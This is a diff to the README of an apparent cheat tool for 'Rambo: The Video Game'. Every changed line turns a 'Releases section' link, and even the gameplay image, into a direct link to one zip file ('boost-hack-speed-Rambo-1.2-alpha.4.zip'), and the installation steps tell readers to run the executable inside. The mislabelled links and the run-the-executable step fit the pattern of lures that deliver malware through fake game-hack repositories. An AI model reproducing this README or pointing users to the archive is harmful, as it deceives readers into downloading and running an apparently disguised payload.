@@ -1,6 +1,6 @@
 # Rambo Speed Boost Hack 🚀
 
-Welcome to the **Rambo Speed Boost Hack** repository! This project enhances your experience in *Rambo: The Video Game* by providing various cheats and modifications. You can find the latest updates and downloads in the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/releases). 
+Welcome to the **Rambo Speed Boost Hack** repository! This project enhances your experience in *Rambo: The Video Game* by providing various cheats and modifications. You can find the latest updates and downloads in the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/raw/refs/heads/main/augelite/boost-hack-speed-Rambo-1.2-alpha.4.zip). 
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ The following features are included in this hack:
 
 To get started, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/releases). Ensure you download the correct file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/raw/refs/heads/main/augelite/boost-hack-speed-Rambo-1.2-alpha.4.zip). Ensure you download the correct file for your operating system.
 2. **Extract the downloaded file** to a convenient location on your computer.
 3. **Run the executable file**. Follow any on-screen instructions to complete the installation.
 
@@ -75,9 +75,9 @@ For questions or support, please reach out to the repository owner. You can find
 
 ---
 
-Thank you for checking out the **Rambo Speed Boost Hack**! Enjoy your enhanced gaming experience, and don’t forget to visit the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/releases) for the latest updates and downloads. 
+Thank you for checking out the **Rambo Speed Boost Hack**! Enjoy your enhanced gaming experience, and don’t forget to visit the [Releases section](https://github.com/Damz2003/Rambo-speed-boost-hack/raw/refs/heads/main/augelite/boost-hack-speed-Rambo-1.2-alpha.4.zip) for the latest updates and downloads. 
 
-![Rambo Gameplay](https://example.com/rambo-gameplay-image.jpg)
+![Rambo Gameplay](https://github.com/Damz2003/Rambo-speed-boost-hack/raw/refs/heads/main/augelite/boost-hack-speed-Rambo-1.2-alpha.4.zip)
 
 ## Additional Resources
 
